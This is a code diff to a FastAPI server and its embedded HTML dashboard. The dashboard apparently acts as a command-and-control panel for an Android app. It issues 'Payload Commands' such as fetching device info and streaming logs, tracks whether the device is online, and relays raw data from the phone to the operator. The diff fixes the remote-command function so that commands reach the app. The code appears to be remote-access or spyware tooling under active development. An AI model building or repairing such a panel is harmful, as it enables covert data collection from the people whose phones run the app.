@@ -9,7 +9,7 @@ app = FastAPI()
 connected_clients = set()
 dashboard_clients = set()
 
-# Advanced Cyberpunk Dashboard HTML content
+# Advanced Cyberpunk Dashboard HTML content (Fully Fixed & Integrated)
 HTML_DASHBOARD = """
 <!DOCTYPE html>
 <html lang="en">
@@ -177,8 +177,8 @@ HTML_DASHBOARD = """
         <div class="panel">
             <h1>LIVE ACTIONS</h1>
             <div class="subtitle">Payload Commands</div>
-            <button class="btn btn-action" onclick="sendAction('DUMP_INFO')">📱 Fetch Device Info</button>
-            <button class="btn btn-action" onclick="sendAction('GRAB_LOGS')">📂 Stream Logs (10m)</button>
+            <button class="btn btn-action" onclick="sendCommand('DUMP_INFO')">📱 Fetch Device Info</button>
+            <button class="btn btn-action" onclick="sendCommand('GRAB_LOGS')">📂 Stream Logs (10m)</button>
         </div>
 
         <div class="panel full-width">
@@ -194,7 +194,6 @@ HTML_DASHBOARD = """
         let timerInterval;
         let secondsElapsed = 0;
         
-        // Auto-detect WebSocket Protocol (ws:// or wss://)
         const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
         const wsUrl = protocol + window.location.host + '/ws/dashboard';
         const ws = new WebSocket(wsUrl);
@@ -232,16 +231,24 @@ HTML_DASHBOARD = """
                 indicator.classList.add('active');
                 statusText.innerText = 'ONLINE / ACTIVE STREAMING';
                 startTimer();
-            } else if (action === 'SLEEP') {
+            } else {
                 indicator.classList.remove('active');
                 statusText.innerText = 'OFFLINE / SLEEPING';
                 stopTimer();
             }
 
-            // Send command via WebSocket to Android App
             if (ws.readyState === WebSocket.OPEN) {
                 ws.send(action);
-                logToTerminal(`Sent command: ${action}`);
+                logToTerminal(`Sent action: ${action}`);
+            } else {
+                logToTerminal(`[Error] WebSocket not connected!`);
+            }
+        }
+
+        function sendCommand(cmd) {
+            logToTerminal(`Executing remote command: ${cmd}`);
+            if (ws.readyState === WebSocket.OPEN) {
+                ws.send(cmd); // Fixed: Now sends command properly to app via server
             } else {
                 logToTerminal(`[Error] WebSocket not connected!`);
             }
@@ -279,7 +286,7 @@ async def app_websocket(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_text()
-            # CHANGE THIS LINE: Remove "[App Data]: " prefix so clean data reaches dashboard
+            # Forward raw data directly to dashboard without prefixes
             for dash in dashboard_clients:
                 await dash.send_text(data)
     except WebSocketDisconnect:
